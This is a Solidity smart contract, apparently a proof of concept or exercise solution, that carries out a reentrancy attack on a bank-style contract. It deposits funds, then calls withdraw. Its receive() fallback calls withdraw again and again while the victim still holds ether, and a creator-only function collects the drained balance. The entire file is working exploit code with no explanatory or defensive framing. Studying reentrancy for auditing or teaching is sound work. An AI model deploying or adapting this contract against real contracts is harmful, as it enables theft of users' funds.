interface IBankInstance {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    IBankInstance public victim;
    address public creator;

    constructor(address _victim) {
        victim = IBankInstance(_victim);
        creator = msg.sender;
    }

    function beginSetup() external payable {
        require(msg.value > 0);
        depositToVictim(msg.value);
    }

    function depositToVictim(uint value) internal {
        victim.deposit{value: value}();
    }

    function launch(uint value) external {
        require(msg.sender == creator);
        victim.withdraw(value);
    }

    receive() external payable {
        repeat();
    }

    function repeat() internal {
        if (address(victim).balance >= msg.value) {
            victim.withdraw(msg.value);
        }
    }

    function withdrawAll() external {
        require(msg.sender == creator);
        transferBalance();
    }

    function transferBalance() internal {
        payable(creator).transfer(address(this).balance);
    }
}